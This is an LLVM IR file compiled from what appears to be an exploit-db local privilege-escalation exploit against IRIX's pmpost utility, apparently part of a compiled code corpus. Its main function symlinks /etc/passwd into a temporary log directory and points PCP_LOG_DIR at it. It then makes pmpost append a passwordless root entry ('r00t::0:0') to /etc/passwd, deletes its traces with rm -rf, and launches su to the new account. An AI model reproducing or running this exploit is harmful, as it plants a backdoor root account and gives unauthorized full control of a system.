; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/irix/local/extr_20937.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/irix/local/extr_20937.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@.str = private unnamed_addr constant [26 x i8] c"/usr/share/pcp/bin/pmpost\00", align 1
@main.buf = internal global [512 x i8] zeroinitializer, align 16
@main.dir = internal global [128 x i8] zeroinitializer, align 16
@.str.1 = private unnamed_addr constant [15 x i8] c"/tmp/dupa.%.8d\00", align 1
@S_IRWXU = common dso_local global i32 0, align 4
@.str.2 = private unnamed_addr constant [12 x i8] c"/etc/passwd\00", align 1
@.str.3 = private unnamed_addr constant [10 x i8] c"./NOTICES\00", align 1
@.str.4 = private unnamed_addr constant [19 x i8] c"PCP_LOG_DIR=%.500s\00", align 1
@.str.5 = private unnamed_addr constant [32 x i8] c"\0Ar00t::0:0:root:/root:/bin/bash\00", align 1
@WUNTRACED = common dso_local global i32 0, align 4
@.str.6 = private unnamed_addr constant [3 x i8] c"..\00", align 1
@.str.7 = private unnamed_addr constant [14 x i8] c"rm -rf dupa.*\00", align 1
@.str.8 = private unnamed_addr constant [8 x i8] c"/bin/su\00", align 1
@.str.9 = private unnamed_addr constant [5 x i8] c"r00t\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main() #0 {
  %1 = alloca i8*, align 8
  store i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str, i64 0, i64 0), i8** %1, align 8
  %2 = call i32 @time(i32* null)
  %3 = call i32 @srand(i32 %2)
  %4 = call i32 (...) @rand()
  %5 = call i32 (i8*, i8*, ...) @sprintf(i8* getelementptr inbounds ([128 x i8], [128 x i8]* @main.dir, i64 0, i64 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.1, i64 0, i64 0), i32 %4)
  %6 = load i32, i32* @S_IRWXU, align 4
  %7 = call i64 @mkdir(i8* getelementptr inbounds ([128 x i8], [128 x i8]* @main.dir, i64 0, i64 0), i32 %6)
  %8 = icmp ne i64 %7, 0
  br i1 %8, label %9, label %11

9:                                                ; preds = %0
  %10 = call i32 @_exit(i32 2) #3
  unreachable

11:                                               ; preds = %0
  %12 = call i64 @chdir(i8* getelementptr inbounds ([128 x i8], [128 x i8]* @main.dir, i64 0, i64 0))
  %13 = icmp ne i64 %12, 0
  br i1 %13, label %14, label %16

14:                                               ; preds = %11
  %15 = call i32 @_exit(i32 3) #3
  unreachable

16:                                               ; preds = %11
  %17 = call i64 @symlink(i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.2, i64 0, i64 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.3, i64 0, i64 0))
  %18 = icmp ne i64 %17, 0
  br i1 %18, label %19, label %21

19:                                               ; preds = %16
  %20 = call i32 @_exit(i32 4) #3
  unreachable

21:                                               ; preds = %16
  %22 = call i32 @snprintf(i8* getelementptr inbounds ([512 x i8], [512 x i8]* @main.buf, i64 0, i64 0), i32 511, i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.4, i64 0, i64 0), i8* getelementptr inbounds ([128 x i8], [128 x i8]* @main.dir, i64 0, i64 0))
  %23 = call i64 @putenv(i8* getelementptr inbounds ([512 x i8], [512 x i8]* @main.buf, i64 0, i64 0))
  %24 = icmp ne i64 %23, 0
  br i1 %24, label %25, label %27

25:                                               ; preds = %21
  %26 = call i32 @_exit(i32 5) #3
  unreachable

27:                                               ; preds = %21
  %28 = call i32 (...) @fork()
  %29 = icmp ne i32 %28, 0
  br i1 %29, label %35, label %30

30:                                               ; preds = %27
  %31 = load i8*, i8** %1, align 8
  %32 = load i8*, i8** %1, align 8
  %33 = call i32 @execl(i8* %31, i8* %32, i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.5, i64 0, i64 0), i32* null)
  %34 = call i32 @_exit(i32 1) #3
  unreachable

35:                                               ; preds = %27
  %36 = load i32, i32* @WUNTRACED, align 4
  %37 = call i32 @waitpid(i32 0, i32* null, i32 %36)
  %38 = call i64 @chdir(i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.6, i64 0, i64 0))
  %39 = call i32 (i8*, i8*, ...) @sprintf(i8* getelementptr inbounds ([512 x i8], [512 x i8]* @main.buf, i64 0, i64 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.7, i64 0, i64 0))
  %40 = call i32 @system(i8* getelementptr inbounds ([512 x i8], [512 x i8]* @main.buf, i64 0, i64 0))
  %41 = call i32 @execl(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.8, i64 0, i64 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.8, i64 0, i64 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.9, i64 0, i64 0), i32* null)
  br label %42

42:                                               ; preds = %35
  ret i32 0
}

declare dso_local i32 @srand(i32) #1

declare dso_local i32 @time(i32*) #1

declare dso_local i32 @sprintf(i8*, i8*, ...) #1

declare dso_local i32 @rand(...) #1

declare dso_local i64 @mkdir(i8*, i32) #1

; Function Attrs: noreturn
declare dso_local i32 @_exit(i32) #2

declare dso_local i64 @chdir(i8*) #1

declare dso_local i64 @symlink(i8*, i8*) #1

declare dso_local i32 @snprintf(i8*, i32, i8*, i8*) #1

declare dso_local i64 @putenv(i8*) #1

declare dso_local i32 @fork(...) #1

declare dso_local i32 @execl(i8*, i8*, i8*, i32*) #1

declare dso_local i32 @waitpid(i32, i32*, i32) #1

declare dso_local i32 @system(i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
